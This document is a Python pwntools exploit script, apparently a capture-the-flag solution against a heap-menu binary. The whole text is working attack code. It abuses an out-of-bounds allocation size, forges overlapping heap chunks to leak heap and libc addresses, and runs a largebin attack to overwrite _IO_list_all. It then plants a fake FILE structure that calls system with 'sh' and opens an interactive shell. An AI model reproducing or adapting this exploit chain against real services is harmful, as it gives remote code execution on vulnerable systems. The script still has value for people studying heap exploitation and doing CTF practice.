#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './main_patched'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# storage_addr = address of fd pointer of chunk
# target = target of fd pointer
def mask(storage_addr, target):
    return target ^ (storage_addr >> 12)

def wait():
    input("waiting")

def rol(x, shift, bits=64):
	return ((x << shift) | (x >> (bits-shift))) % (1<<bits)

def ror(x, shift, bits=64):
	return ror(x, bits-shift, bits=bits)

def create(data):
    io.sendlineafter(b"place\n", b"1")
    io.sendlineafter(b": ", data)

def view(idx):
    io.sendlineafter(b"place\n", b"2")
    io.sendlineafter(b": ", str(idx).encode())

def delete(idx):
    io.sendlineafter(b"place\n", b"3")
    io.sendlineafter(b": ", str(idx).encode())

def replace(idx1, idx2):
    io.sendlineafter(b"place\n", b"4")
    io.sendlineafter(b": ", str(idx1).encode())
    io.sendlineafter(b": ", str(idx2).encode())

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
break *(_IO_flush_all+176)
break *(_IO_wdoallocbuf+28)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

# will allocate 0x20 chunk only
oob = -((2**64-1) // 8 - 3)
io.sendlineafter(b"list", str(oob).encode())

create(b"AAAA")
create(b'A'*0x18 + p64(0x641)+ p64(0) + p64(0x611-0x30))
# leak because we overwrote chunk data with a chunk pointer
for i in range(0xc9):
    create(b"AAAA")

view(0)
io.recvuntil(b"element : ")
heap_base = u64(io.recvn(6)+b"\0\0") - 0x2730
log.info(f"heap: {hex(heap_base)}")
log.info(f"chunk struct: {hex(heap_base+0x290)}")

# set chunk0 size to 0x641, will point to our 0x611-0x30 fakechunk
replace(5, 0xcb)
delete(0)

# overwrite chunk0 with heap_base + 0x8e0 -> 0x30 chunk still in unsorted bin that contains pointers
pre_payload = p64(heap_base + 0x8e0) # 6
# points to 2 fake chunks and 2 real chunks

# fake 1
pre_payload += p64(heap_base + 0x4d190) # 7
log.info(f"7: {hex(heap_base + 0x4d190)}")
fake1 = 7

# fake 2
pre_payload += p64(heap_base + 0x4d7a0) # 8
log.info(f"8: {hex(heap_base + 0x4d7a0)}")
fake2 = 8

# real1 (overlaps with fake1 so we can overwrite fake1 after it has been freed)
pre_payload += p64(heap_base+0x4d180) # 9
log.info(f"9: {hex(heap_base + 0x4d180)}")
real1 = 9

# real2  (overlaps with fake2 so we can overwrite fake2 after it has been freed)
pre_payload += p64(heap_base + 0x4d790) # 10
log.info(f"10: {hex(heap_base + 0x4d790)}")
real2 = 10

create(pre_payload)
view(6)

io.recvuntil(b"element : ")
libc.address = u64(io.recvn(6)+b"\0\0") - 0x1d6b20
log.info(f"Libc leak: {hex(libc.address)}")

payload1 = p64(0) + p64(0x431) + b'\0'*0x428 + p64(0x21)*8 # fake chunk 1 (idx 7)
payload2 = p64(0) + p64(0x421) + b'\0'*0x418 + p64(0x21)*8 # fake chunk 2, slightly smaller size but same largebin (idx 8)
create(payload1)
create(payload2)

delete(fake1)
# bigger allocation than 0x431 -> fake1 will be moved from unsorted to large bin
create("AAA")

# delete real1 overlapping with fake1 so we can change bk_nextsize
delete(real1)
# -0x20 because bk_nextsize points to the start of the chunk and we want the overwrite of
# fd_nextsize (offset 0x20 in chunk) to overwrite IO_list_all
create(p64(0) + p64(0x431) + p64(0)*2 + p64(0) + p64(libc.sym['_IO_list_all']-0x20))

log.info(f"IO_list_all: {hex(libc.sym['_IO_list_all'])}")

delete(fake2)

# will put fake2 into large bin
# will overwrite [fake1](%p)->bk_nextsize->fd_nextsize to [fake2]
# [fake1](%p)->bk_nextsize->fd_nextsize = IO_list_all ,which has now been overwritten to fake2
create("AAA")

# free real2, which overlaps with fake2 in order to write fake FILE struct to fake2
delete(real2)


fake_file_addr = heap_base+0x4d790
log.info(f"fake file address ?: {hex(fake_file_addr)}")

lock = libc.address + 0x1d8700
file = FileStructure(0)
file.flags = u64(b"\x01\x01\x01\x01;sh;")
file._IO_write_ptr = 1
file._lock = lock
file.chain = libc.sym['system']
file._wide_data = fake_file_addr
file.vtable = libc.sym['_IO_wfile_jumps']


'''
rax points to our fake_file_structure, set +0xe0 to address of our file_struct
again, such that call rax + 0x68 = file->chain(faile->flags)

 ► 0x7ffff7e5859c <_IO_wdoallocbuf+28>    mov    rax, qword ptr [rax + 0xe0]
   0x7ffff7e585a3 <_IO_wdoallocbuf+35>    call   qword ptr [rax + 0x68]
'''
payload = bytes(file) + p64(fake_file_addr)

create(payload)

io.sendlineafter("[4]", "5")
io.interactive()


# 0x64040b5f02a0: 0x000064040b5f02d0      0x000064040b5f08e0
# 0x64040b5f02a0: 0x000064040b5f08e0      0x000064040b5f02d0